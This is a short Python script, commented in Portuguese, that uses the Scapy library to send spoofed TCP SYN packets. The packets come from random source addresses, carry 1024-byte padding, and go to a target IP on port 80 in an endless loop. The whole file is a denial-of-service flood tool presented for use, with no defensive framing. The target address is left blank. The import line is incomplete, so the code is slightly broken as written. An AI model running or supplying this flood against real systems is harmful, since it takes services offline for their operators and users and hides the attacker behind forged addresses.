#pip install scapy
#baixar a bibloteca Scapy.all

from scapy.all import

#IP ATIVO

target_ip = ''

#porta a ser direcionada
target_port = 80

ip = IP (src=RandIP(), dst= target_ip)

tcp = TCP (sport=RandShort(),
            dport=target_port,
            flags='s')

raw = Raw(b'x'*1024)

pkt = ip/tcp/raw
send(pkt,loop = 1)

